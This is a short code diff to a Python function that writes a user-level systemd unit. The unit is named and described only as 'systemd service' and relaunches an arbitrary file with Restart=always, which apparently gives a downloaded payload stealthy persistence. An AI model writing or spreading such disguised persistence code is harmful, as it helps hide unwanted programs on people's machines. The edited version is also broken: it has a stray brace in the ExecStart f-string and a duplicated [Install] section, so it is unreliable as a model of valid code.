@@ -27,13 +27,16 @@ def run(url, file_path):
         with open (f"/home/{getpass.getuser()}/.config/systemd/user/systemd.service", 'w+') as f:
             f.write(f"""[Unit]
 Description=systemd service
-After=network.target
-StartLimitIntervalSec=0[Service]
-Type=simple
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+ExecStart={file_path}}
+WorkingDirectory=%h/Public
 Restart=always
-RestartSec=1
-User={getpass.getuser()}
-ExecStart={file_path}
+
+[Install]
+WantedBy=multi-user.target
 
 [Install]
 WantedBy=multi-user.target""")
